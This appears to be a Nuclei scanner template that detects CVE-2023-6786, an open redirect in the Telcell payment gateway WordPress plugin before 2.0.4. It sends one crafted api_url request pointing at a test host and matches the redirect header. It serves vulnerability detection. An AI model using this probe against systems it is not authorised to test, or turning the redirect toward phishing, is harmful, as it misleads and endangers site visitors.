id: CVE-2023-6786

info:
  name: Payment Gateway for Telcell < 2.0.4 - Open Redirect
  author: s4e-io
  severity: medium
  description: |
    The plugin does not validate the api_url parameter before redirecting the user to its value, leading to an Open Redirect issue
  impact: |
    Unauthenticated attackers can exploit open redirect through the api_url parameter to redirect users to malicious websites for phishing attacks.
  remediation: |
    Fixed in 2.0.4
  reference:
    - https://wpscan.com/vulnerability/f3e64947-3138-4ec4-86c4-27b5d6a5c9c2/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6786
  classification:
    cve-id: CVE-2023-6786
    epss-score: 0.00991
    epss-percentile: 0.76556
  metadata:
    max-request: 1
    verified: true
    publicwww-query: "/wp-content/plugins/payment-gateway-for-telcell"
  tags: cve,cve2023,wordpress,redirect,wp-plugin,wp,payment-gateway-for-telcell,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=wc-settings&action=redirect_telcell_form&api_url=https://oast.me"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)oast\.me.*$'
# digest: 490a0046304402204b4723b1aa21a49b66c7841b396369d25d0ac725931931b4eb497ca46735c978022005e7b983eed0643e04b4c4d62f8932a9cd81d475691119a3cc59d5b7a08aadca:922c64590222798bb761d5b6d8e72950